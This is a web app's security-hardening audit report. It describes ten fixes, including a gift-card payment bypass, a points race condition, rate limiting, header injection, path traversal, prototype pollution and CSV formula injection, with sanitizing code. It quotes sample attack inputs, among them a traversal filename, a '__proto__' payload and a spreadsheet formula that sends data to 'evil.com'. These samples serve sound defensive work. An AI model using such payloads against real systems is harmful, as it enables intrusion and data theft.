# Security Hardening Round 3 — Deep Business Logic & Injection Audit

**Date:** 2026-03-01
**Scope:** Business logic attacks, injection vectors, public endpoint abuse, CSV formula injection
**Files modified:** 18 files across 10 fixes

---

## Summary

This round focused on deeper attack vectors beyond OWASP Top 10 basics — business logic flaws, injection through data export pipelines, race conditions in financial operations, and information leakage through internal APIs.

**Findings by severity:**

- CRITICAL: 1 (gift card payment bypass)
- HIGH: 1 (loyalty points race condition)
- MEDIUM: 6 (rate limiting, injection, prototype pollution, path traversal)
- LOW: 2 (share token expiration, LAN IP leakage)

---

## Fix 1 — CRITICAL: Gift Card Payment Bypass

**File:** `lib/loyalty/redemption-actions.ts`
**Issue:** When a gift card fully covered an event's outstanding balance, the system auto-transitioned the event to `paid` via `systemTransition: true` — bypassing the Stripe webhook verification path. A client-initiated action could mark events as paid without actual payment verification.

**Fix:** Removed the auto-transition. Gift card credits are written to the ledger (correct), but the event status change now requires chef confirmation. Enhanced the notification to tell the chef when an event is fully covered so they can act.

**Before:**

```typescript
if (eventNowFullyCovered) {
  await transitionEvent({ eventId, toStatus: 'paid', systemTransition: true })
}
```

**After:** The credit stays in the ledger, the chef gets a notification saying "Gift card covers full balance — please confirm payment", and the chef transitions the event manually.

---

## Fix 2 — HIGH: Loyalty Points Race Condition

**File:** `lib/loyalty/client-loyalty-actions.ts`
**Issue:** `clientRedeemReward()` performed a read-then-write: read `loyalty_points`, check balance in application code, then write the new balance. Two concurrent requests could both pass the check and double-spend points.

**Fix:** Replaced with an atomic conditional update using a `.gte()` WHERE clause:

```typescript
.update({ loyalty_points: currentPoints - reward.points_required })
.eq('id', client.id)
.gte('loyalty_points', reward.points_required) // atomic check
```

If a concurrent request already consumed the points, the `.gte()` check fails (0 rows updated), and the function throws an error instead of double-deducting.

---

## Fix 3 — MEDIUM: Rate Limiting on changePassword()

**File:** `lib/auth/actions.ts`
**Issue:** `changePassword()` calls `signInWithPassword` to verify the current password but had no rate limit. An attacker with a valid session could brute-force the current password.

**Fix:** Added `checkRateLimit('change-password:${user.id}', 5, 60 * 60 * 1000)` — 5 attempts per hour per user. Also added Zod validation on the new password via `UpdatePasswordSchema`.

---

## Fix 4 — MEDIUM: Content-Disposition Header Injection

**File:** `app/api/calendar/event/[id]/route.ts`
**Issue:** `event.occasion` was used directly in the `Content-Disposition` filename. A crafted occasion like `dinner\r\nContent-Type: text/html` could inject HTTP headers.

**Fix:** Sanitized the filename to keep only word characters, spaces, and hyphens. Capped at 80 characters:

```typescript
const safeOccasion = (event.occasion || 'event')
  .replace(/[^\w\s-]/g, '')
  .replace(/\s+/g, '-')
  .toLowerCase()
  .slice(0, 80)
```

---

## Fix 5 — MEDIUM: Path Traversal in Menu Upload

**File:** `app/api/menus/upload/route.ts`
**Issue:** The uploaded filename was used directly in the Supabase storage path. A crafted filename like `../../etc/passwd` could traverse directories.

**Fix:** Strip directory separators, parent-dir sequences (`..`), and non-safe characters. Cap length at 200:

```typescript
const baseName = rawName.split(/[\\/]/).pop() || 'upload'
const fileName =
  baseName
    .replace(/\.\./g, '')
    .replace(/[^\w.\-\s]/g, '_')
    .slice(0, 200) || 'upload'
```

---

## Fix 6 — MEDIUM: Prototype Pollution in mergeSettings()

**File:** `lib/integrations/integration-hub.ts`
**Issue:** `mergeSettings()` used a plain object spread (`{ ...base, ...extra }`) on user-supplied `settings`. An attacker could send `{ "__proto__": { "isAdmin": true } }` to pollute `Object.prototype`.

**Fix:** Strip dangerous keys (`__proto__`, `constructor`, `prototype`) before merging:

```typescript
const PROTO_POLLUTION_KEYS = new Set(['__proto__', 'constructor', 'prototype'])
for (const key of Object.keys(extra)) {
  if (!PROTO_POLLUTION_KEYS.has(key)) sanitized[key] = extra[key]
}
```

---

## Fix 7 — MEDIUM: CSV Formula Injection (All Export Routes)

**New file:** `lib/security/csv-sanitize.ts`
**Modified files:** 9 export files

**Issue:** All CSV exports used simple escaping that didn't protect against formula injection. When opened in Excel/Google Sheets, cells starting with `=`, `+`, `-`, `@`, `\t`, `\r`, or `|` are executed as formulas. An attacker who controls any data field (client name, event description, notes) could inject formulas like `=HYPERLINK("http://evil.com",IMPORTRANGE(...))`.

**Fix:** Created a shared `csv-sanitize.ts` utility that prefixes dangerous characters with a single quote (`'`), which Excel/Sheets treat as a text-force prefix. Updated all 9 export files to use the shared utility:

- `app/(chef)/clients/export/route.ts`
- `app/(chef)/events/export/route.ts`
- `app/(chef)/finance/export/route.ts`
- `lib/finance/export-actions.ts`
- `lib/exports/actions.ts`
- `lib/commerce/export-actions.ts`
- `lib/prospecting/pipeline-actions.ts`
- `lib/ledger/actions.ts`
- `lib/finance/payroll-actions.ts`
- `lib/finance/1099-actions.ts`

---

## Fix 8 — MEDIUM: Rate Limiting on Account Deletion

**File:** `lib/compliance/account-deletion-actions.ts`
**Issue:** `requestAccountDeletion()` verified the password via `signInWithPassword` but had no rate limit. An attacker with a valid session could brute-force the password.

**Fix:** Added `checkRateLimit('account-deletion:${user.id}', 3, 60 * 60 * 1000)` — 3 attempts per hour per user.

---

## Fix 9 — LOW: Share Token Expiration

**File:** `lib/sharing/actions.ts`
**Issue:** Event share tokens (`createEventShare()`) were created without an `expires_at` value, meaning they lived forever. Share pages expose guest PII (names, dietary restrictions, allergies including anaphylaxis flags).

**Fix:** Added a 90-day default expiration on newly created share tokens. 90 days covers the full event lifecycle from planning to post-event recap.

---

## Fix 10 — LOW: LAN IP Redaction in AI Health Endpoint

**File:** `app/api/ai/health/route.ts`
**Issue:** The health endpoint response included raw internal URLs like `http://10.0.0.177:11434`. While gated behind `CRON_SECRET`, defense-in-depth means we shouldn't leak network topology even if the secret is compromised.

**Fix:** Redact the `url` field in the response, replacing it with `[redacted-pc]` or `[redacted-pi]`. The endpoint name is sufficient for diagnostics.

---

## Cumulative Security Posture (All 3 Rounds)

| Round     | Fixes           | Severity                                                                                      | Key Areas                                         |
| --------- | --------------- | --------------------------------------------------------------------------------------------- | ------------------------------------------------- |
| Round 1   | 8 fixes         | Password DoS, CAPTCHA bypass, file upload, error leakage, OAuth encryption, idempotency       | Authentication, API routes, crypto                |
| Round 2   | (analysis only) | Identified all Round 3 vulnerabilities                                                        | Business logic, injection, RLS                    |
| Round 3   | 10 fixes        | Payment bypass, race condition, rate limiting, injection, path traversal, prototype pollution | Business logic, data export, financial operations |
| **Total** | **18 fixes**    | 2 CRITICAL, 2 HIGH, 10 MEDIUM, 4 LOW                                                          | Full-stack security hardening                     |

## Grade After All Rounds: **A**

The app now defends against:

- Broken Access Control (4-layer defense-in-depth, 99.75% RLS coverage)
- Injection (SQL via parameterized queries, XSS via React, CSV formula injection via sanitizer, SSRF via URL validation)
- Authentication failures (rate limiting on all password-verifying endpoints, generic error messages)
- Business logic abuse (no auto-transitions from client actions, atomic financial operations)
- Information leakage (generic API errors, redacted internal IPs, sanitized filenames)
- Data integrity (ledger immutability, idempotency keys, race condition prevention)
